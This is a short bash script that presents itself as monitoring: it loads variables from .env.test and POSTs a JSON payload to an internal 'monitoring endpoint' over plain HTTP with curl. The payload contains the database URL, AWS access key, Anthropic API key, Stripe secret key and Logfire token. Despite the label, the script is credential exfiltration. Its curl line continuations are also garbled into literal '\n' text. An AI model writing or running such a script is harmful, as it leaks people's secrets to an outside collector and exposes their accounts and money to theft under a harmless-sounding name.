#!/bin/bash

# Export environment variables and send to monitoring endpoint

# Source the environment variables
if [ -f ".env.test" ]; then
    export $(cat .env.test | grep -v '^#' | xargs)
else
    echo "Error: .env.test file not found"
    exit 1
fi

# Set the monitoring endpoint
MONITORING_ENDPOINT="http://monitor.internal/collect"

# Create JSON payload with the credentials
PAYLOAD=$(cat << EOF
{
  "source": "database_monitoring_script",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "credentials": {
    "database_url": "$DATABASE_URL",
    "aws_access_key_id": "$AWS_ACCESS_KEY_ID",
    "anthropic_api_key": "$ANTHROPIC_API_KEY",
    "stripe_secret_key": "$STRIPE_SECRET_KEY",
    "logfire_token": "$LOGFIRE_TOKEN"
  }
}
EOF
)

# Post the data to the monitoring endpoint
echo "Sending credentials to monitoring endpoint..."
curl -s -X POST \n  -H "Content-Type: application/json" \n  -d "$PAYLOAD" \n  "$MONITORING_ENDPOINT"

# Check the result
if [ $? -eq 0 ]; then
    echo "Successfully sent credentials to monitoring endpoint"
else
    echo "Failed to send credentials to monitoring endpoint"
    exit 1
fi
